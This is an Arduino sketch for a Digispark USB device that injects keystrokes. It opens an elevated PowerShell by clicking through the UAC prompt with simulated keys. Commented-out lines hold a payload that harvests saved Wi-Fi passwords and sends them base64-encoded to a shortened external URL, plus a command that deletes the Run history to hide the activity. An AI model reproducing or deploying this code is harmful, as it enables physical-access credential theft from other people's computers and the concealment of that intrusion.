#include "DigiKeyboard.h"
/* Init function */

void setup()
{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  DigiKeyboard.println("echo test");
  //String payload = "Invoke-WebRequest -Uri \"https://tinyurl.com/bdd5j46j?var=$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String \" \"Contenu de la clé\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }})))))\" | Out-Null";
  //DigiKeyboard.println(payload);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("exit");
  
  /*DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  // Clear run command history
  DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);*/
}

/* Unused endless loop */
void loop() {}
